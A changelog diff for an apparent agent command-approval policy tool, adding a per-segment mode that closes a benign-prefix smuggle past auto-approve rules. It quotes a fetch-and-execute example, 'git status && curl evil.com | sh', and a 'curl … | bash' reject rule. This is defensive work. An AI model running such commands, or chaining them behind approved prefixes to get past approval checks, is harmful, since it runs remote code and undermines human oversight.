@@ -1,5 +1,10 @@
 # Changelog
 
+## [1.3.0] — 2026-06-26
+
+### Added
+- **Per-segment Bash composition mode (`bash_composition: "per_segment"`).** A new optional policy field. When set, a chained Bash call (`git status && curl evil.com | sh`) is split at top-level shell operators by a quoting-aware scanner and each segment is evaluated independently; the decision is the **stricter** of the whole-command and per-segment readings. Auto-approval becomes narrow — *every* segment must match an `auto_approve` rule — which closes the benign-prefix smuggle where a `^git ` rule would otherwise approve `git status && curl evil.com`. `auto_reject` / `auto_defer` stay broad (still matched against the whole command), so a `curl … | bash` rule or a compound-spanning defer rule keeps firing. Constructs the scanner can't inspect piece-by-piece — command substitution `$(…)`/backticks, here-docs, process substitution — and malformed chains are rejected with a message telling Session B to re-issue each command separately; a trailing `;` or `&` (a backgrounded command like `npm run dev &`) is a complete command and passes through to normal matching. The starter policy ships the mode on; `permissive` and any policy that omits the field are unaffected. `policy-test --explain` walks the decision per segment. Additive — no new event `kind`, CLI subcommand, or MCP tool; the frozen 1.x contract is intact.
+
 ## [1.2.0] — 2026-06-23
 
 ### Added
